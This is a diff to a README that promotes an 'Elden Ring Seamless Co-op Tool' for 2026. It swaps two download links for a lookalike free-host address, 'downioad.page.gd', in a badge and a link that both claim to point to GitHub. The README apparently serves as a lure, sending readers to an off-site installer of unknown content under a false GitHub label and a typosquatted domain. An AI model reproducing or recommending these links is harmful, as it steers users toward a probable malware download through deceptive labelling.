@@ -2,7 +2,7 @@
 
 Welcome to the Elden Ring Seamless Co-op Tool, designed to elevate your gaming experience in Elden Ring. This tool facilitates seamless cooperative play, allowing you and your friends to explore the vast world together without interruptions or synchronization issues. Updated for 2026, it includes advanced features for character customization, world state management, and exploration aids, making it an essential companion for modding enthusiasts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -77,7 +77,7 @@ A5: The tool operates externally and does not alter core game files. Changes mad
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Version History
 
